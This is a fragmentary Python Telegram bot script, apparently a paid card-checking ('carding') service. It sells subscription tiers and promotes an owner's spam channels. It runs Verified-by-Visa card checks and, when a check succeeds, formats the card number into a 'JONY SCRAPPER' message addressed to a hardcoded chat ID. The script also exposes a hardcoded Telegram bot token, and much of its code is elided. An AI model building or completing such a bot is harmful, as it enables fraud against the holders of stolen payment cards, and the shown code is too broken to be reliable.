...
import threading
stopuser = {}
token = '7263904870:AAGgJcM82fj_gBK9pVGwkS8YpPygV1s7h3k'
	...
	def my_function():
	  ...
	  "timer": "none",
		...
		if BL == '𝗙𝗥𝗘𝗘':	
			...
			fadynader = types.InlineKeyboardMarkup(row_width=1)
			fady = types.InlineKeyboardButton(text="‌ 𝗢𝗪𝗡𝗘𝗥  ‌", url="https://t.me/far3on_spamm")
			contact_button = types.InlineKeyboardButton(text="‌ 𝘾𝙃𝘼𝙉𝙉𝙀𝙇  ‌", url="https://t.me/far3on_spam")
			keyboard.add(contact_button, fady)
			video_url = f'https://t.me/far3on_spam/19'
...
Make The Payment First, Then Contact The Developer to Confirm The Payment And Choose a Subscription
━━━━━━━━━━━━━━━━━━━━━━━
𝑪𝑳𝑰𝑪𝑲 /cmds
 𝑻𝑶 𝑽𝑰𝑬𝑾 𝑻𝑯𝑬 𝑪𝑶𝑴𝑴𝑨𝑵𝑫𝑺

𝒀𝑶𝑼𝑹 𝑷𝑳𝑨𝑵 𝑵𝑶𝑾 {BL}</b>
	''',reply_markup=keyboard)
			return
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="‌ 𝗢𝗪𝗡𝗘𝗥 ‌", url="https://t.me/far3on_spamm")
		fady = types.InlineKeyboardButton(text="‌ 𝘾𝙃𝘼𝙉𝙉𝙀𝙇 ‌", url="https://t.me/far3on_spam")
		keyboard.add(contact_button, fady)
...
𝘽𝙤𝙩 𝘽𝙮 @far3on_spamm''', reply_markup=mes)
...
◆ 𝑻𝑨𝑲𝑬𝑵 ➜ {"{:.1f}".format(execution_time)} secounds .</b>'''
					if 'success' in last:
						tok = '7263904870:AAGgJcM82fj_gBK9pVGwkS8YpPygV1s7h3k'
						acc =  "6883099567"
						mg = f"""<b> 
❆═══» 𝙹𝙾𝙽𝚈 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁 «═══❆
｢𝙲𝙲」➔ <code>{cc}</code>
...
def respond_to_vbv(message):
  ...
  "timer": "none",
	...
	if BL == '𝗙𝗥𝗘𝗘':
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="‌ 𝗢𝗪𝗡𝗘𝗥  ‌", url="@far3on_spamm")
		fady = types.InlineKeyboardButton(text="‌ 𝘾𝙃𝘼𝙉𝙉𝙀𝙇  ‌", url="https://t.me/far3on_spam")
		keyboard.add(contact_button, fady)
